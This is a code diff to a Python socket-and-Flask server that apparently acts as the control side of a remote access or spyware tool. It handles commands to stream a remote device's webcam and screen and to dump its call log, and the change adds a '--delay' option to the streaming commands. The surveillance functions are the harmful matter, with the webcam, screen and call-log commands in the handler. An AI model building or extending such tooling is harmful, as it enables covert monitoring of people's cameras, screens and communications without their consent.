@@ -41,12 +41,14 @@ def video_feed():
     return Response(generate_frames(client_socket_global),
                     mimetype='multipart/x-mixed-replace; boundary=frame')
 
-def start_streaming(client_socket, mode):
+def start_streaming(client_socket, mode, delay=0):
     global streaming, flask_server, client_socket_global
     streaming = True
     client_socket_global = client_socket  # Assign the client_socket to the global variable
     print(Fore.BLUE + "[ * ] Starting...")
-    time.sleep(1)
+    if delay > 0:
+        print(Fore.BLUE + f"[ * ] Delaying for {delay} seconds...")
+        time.sleep(delay)
     print(Fore.BLUE + "[ * ] Preparing player...")
     time.sleep(1)
 
@@ -114,8 +116,15 @@ def handle_client(client_socket, addr):
             continue
 
         if command.startswith("webcam_stream") or command.startswith("screen_stream"):
-            mode = command.split('_')[0]
-            start_streaming(client_socket, mode)
+            parts = command.split()
+            mode = parts[0].split('_')[0]
+            delay = 0
+            if len(parts) > 1 and parts[1].startswith('--delay'):
+                try:
+                    delay = int(parts[1].split('=')[1])
+                except ValueError:
+                    print(Fore.RED + "[ * ] Invalid delay value, starting without delay.")
+            start_streaming(client_socket, mode, delay)
             continue
 
         if command.startswith("dump_calllog"):
